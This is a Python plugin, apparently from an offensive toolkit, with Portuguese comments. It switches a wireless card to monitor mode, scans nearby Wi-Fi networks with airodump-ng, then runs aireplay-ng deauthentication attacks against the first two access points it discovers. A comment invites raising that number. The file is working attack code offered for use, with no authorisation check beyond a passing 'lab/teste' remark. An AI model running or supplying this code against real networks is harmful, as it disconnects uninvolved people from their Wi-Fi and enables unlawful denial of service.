# plugins/wifi_attack.py
def run(target, results):
    """
    Plugin de ataque wireless: scan, deauth e restauração de interface.
    target: ignorado (operação local)
    results: dicionário acumulador de resultados
    """
    import subprocess
    import re
    import time
    from pathlib import Path

    # 1. Descobrir interfaces wireless compatíveis
    iw_dev_cmd = "iw dev"
    iw_out = subprocess.getoutput(iw_dev_cmd)
    interfaces = re.findall(r'Interface\s+([^\s]+)', iw_out)
    if not interfaces:
        results['wifi_attack'] = {'erro': 'Nenhuma interface wireless detectada! (precisa de placa compatível e root)'}
        return

    iface = interfaces[0]
    results['wifi_attack'] = {'interface': iface}

    # 2. Colocar a interface em modo monitor
    try:
        subprocess.run(f"sudo ip link set {iface} down", shell=True, check=True)
        subprocess.run(f"sudo iw dev {iface} set type monitor", shell=True, check=True)
        subprocess.run(f"sudo ip link set {iface} up", shell=True, check=True)
        time.sleep(1)
    except Exception as e:
        results['wifi_attack']['erro'] = f'Erro ao configurar modo monitor: {e}'
        return

    # 3. Scan de redes Wi-Fi (beacon dump)
    scan_cmd = f"timeout 10s sudo airodump-ng --output-format csv -w /tmp/wifi_scan {iface}"
    subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    csv_file = Path("/tmp/wifi_scan-01.csv")
    if not csv_file.exists():
        results['wifi_attack'].update({'erro': 'Falha no scan wireless ou permissão insuficiente.'})
        # Tenta restaurar a interface para evitar problemas
        subprocess.run(f"sudo ip link set {iface} down", shell=True)
        subprocess.run(f"sudo iw dev {iface} set type managed", shell=True)
        subprocess.run(f"sudo ip link set {iface} up", shell=True)
        return

    # 4. Parse dos resultados do scan
    bssids = []
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        for line in lines:
            if re.match(r"^([0-9A-Fa-f:]{17}),", line):
                cols = line.split(',')
                bssid = cols[0]
                essid = cols[13].strip()
                if essid and bssid:
                    bssids.append({'bssid': bssid, 'essid': essid})
    except Exception as e:
        results['wifi_attack'].update({'erro': f'Falha ao processar scan: {e}'})
        return

    results['wifi_attack']['redes_encontradas'] = bssids

    # 5. Opcional: deauth em todos os BSSIDs (lab/teste)
    deauthed = []
    for ap in bssids[:2]:  # Ajuste aqui se quiser atacar mais de 2 redes!
        bssid = ap['bssid']
        try:
            deauth_cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {iface}"
            proc = subprocess.run(deauth_cmd, shell=True, timeout=8, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            deauthed.append({'bssid': bssid, 'saida': proc.stdout.decode(errors="ignore")})
        except Exception as e:
            deauthed.append({'bssid': bssid, 'erro': str(e)})

    results['wifi_attack']['deauth'] = deauthed

    # 6. Restaurar interface ao modo normal (managed)
    subprocess.run(f"sudo ip link set {iface} down", shell=True)
    subprocess.run(f"sudo iw dev {iface} set type managed", shell=True)
    subprocess.run(f"sudo ip link set {iface} up", shell=True)
